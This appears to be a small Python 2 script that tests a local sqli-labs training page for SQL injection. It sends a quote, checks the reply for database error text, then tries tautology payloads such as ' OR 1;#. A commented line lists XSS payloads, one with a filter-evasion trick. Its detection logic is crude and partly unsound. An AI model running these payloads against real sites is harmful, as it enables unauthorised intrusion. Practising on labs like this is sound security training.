import requests
import sys
url = "http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id="
initial = "'"
secondary = ["' OR 1;#", " OR 1;#"]
#payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']

first = requests.post(url+initial)
if "mysql" in first.text.lower() or "native client" in first.text.lower() or "syntax error" in first.text.lower():
	print "Injectable"
	for payload in secondary:
		req = requests.post(url+payload)
		if payload in req.text:
			print "Parameter vulnerable\r\n"
			print "Attack string: "+payload
			print req.text
			break